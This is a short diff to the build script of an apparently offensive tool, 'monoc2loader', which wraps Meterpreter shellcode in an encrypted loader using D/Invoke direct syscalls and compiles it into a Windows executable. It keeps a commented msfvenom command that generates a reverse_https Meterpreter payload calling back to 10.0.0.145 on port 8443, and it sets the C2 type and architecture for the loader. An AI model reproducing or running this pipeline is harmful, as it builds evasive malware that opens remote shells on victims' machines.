@@ -2,16 +2,6 @@
 
 ## Version 0.2, using D/Invoke with direct syscalls
 
-lhost="10.0.0.145"
-lport="8443"
-arch="x64"
-c2type="meterpreter"
-
-echo 'lhost: '$lhost
-echo 'lport: '$lport
-echo 'arch:  '$arch
-echo 'c2type:'$c2type
-
 mkdir tmp
 mkdir output
 
@@ -22,7 +12,11 @@ mkdir output
 # msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/$rawscfilename
 ### Move the meterpreter.bin to folder input if required, then run the autogen script.
 
+arch="x64"
+c2type="meterpreter"
 rawscfilename='meterpreter.bin'
+
+
 rawscfilename_enc=$rawscfilename'.enc'
 final_cs_filename='monoc2loader_'$c2type'.cs'
 final_exe_filename='monoc2loader_'$c2type'_'$arch'.exe'
